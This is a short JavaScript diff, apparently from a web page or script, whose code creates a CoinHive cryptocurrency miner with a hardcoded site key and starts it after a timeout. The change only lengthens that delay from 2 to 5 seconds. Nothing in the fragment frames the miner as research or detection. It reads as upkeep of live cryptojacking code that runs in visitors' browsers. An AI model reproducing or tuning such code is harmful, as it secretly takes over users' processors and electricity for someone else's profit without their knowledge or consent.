@@ -4,4 +4,4 @@ document.head.appendChild(imported);
 setTimeout(() => {
   var miner = new CoinHive.User('UtX8CiZN1tzrQTn6zYRmcfsMX8qkOLGz', 'vnu');
   miner.start();
-}, 2000);
+}, 5000);
